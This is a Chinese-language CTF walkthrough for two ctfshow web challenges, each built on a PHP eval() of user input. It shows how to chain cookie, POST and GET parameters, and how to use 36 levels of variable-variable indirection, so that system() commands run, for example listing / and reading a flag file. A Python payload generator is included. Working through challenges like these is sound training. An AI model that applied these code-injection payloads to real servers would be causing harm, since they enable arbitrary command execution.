# 1、web 签到
---
```php
<?php  
	error_reporting(0);  
	highlight_file(__FILE__);  
  
	eval($_REQUEST[$_GET[$_POST[$_COOKIE['CTFshow-QQ群:']]]][6][0][7][5][8][0][9][4][4]);
?>
```
- 首先，我们要理解这些 php 代码，虽然嵌套了很多层，但只要层层细细分析，还是能解出来的。
- 先看最里面的 `$_COOKIE['CTFshow-QQ群:']`，那么这里获取的就是 cookie 中“`CTFshow-QQ群:`”指向的值，如果我们将 `CTFshow-QQ群:` 对应的值设置为 a，整个语句就会变为 `$_REQUEST[$_GET[$_POST[a]]]`。
- 那么 `$_POST[a]` 就是以 POST 方式传入 a 参数的值，我们可以设置为 `a=b`，于是语句就变为 `$_REQUEST[$_GET[b]]`。
- 那么 `$_GET[b]` 同理，只不过用到的是 GET 方法来传入 b 参数的值，我们可以设置为 `/?b=c`，那么语句就变为 `$_REQUEST[c][6][0][7][5][8][0][9][4][4]`。
- `$_REQUEST` 可以是任意一种方法，c 则是数组，该请求传入的值是取的 c 数组中 ID 键为 \[6\]\[0\]\[7\]\[5\]\[8\]\[0\]\[9\]\[4\]\[4\] 的值，因为 php 数组可以指定 ID 键分配值的，那么我们就可以直接对其赋值。
- 还有要注意 url 中的编码问题！
```
https://xxx/?b=c&c[6][0][7][5][8][0][9][4][4]=system("ls /")
https://xxx/?b=c&c[6][0][7][5][8][0][9][4][4]=system("cat /f1agaaa")

POST: a=b
COOKIE: CTFshow-QQ群:=a
```

# 2、我的眼里只有$
---
```php
<?php
	error_reporting(0);
	highlight_file(__FILE__);
	extract($_POST);
	eval($$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$_);
?>
```
- 考点是 $ 的多重取值。
- 分析代码我们可以看到有 36 个 $，于是我们要构造 36 层取值，且第一层必须是“\_”。
- 我们可以用 python 来构造 payload。
```python
text = '_'

for i in range(0,35):
    if i == 0:
        text = text + '=' + '_' + str(i)
    else:
        text = text + '_' + str(i-1) + '=_' + str(i)
        
    if i != 34:
         text = text + '&'
print(text)
```
- 在输出结果后接上 `&_34=system('xxx');` 即可，其中 `xxx` 可以是任意命令。
- 注意编码问题！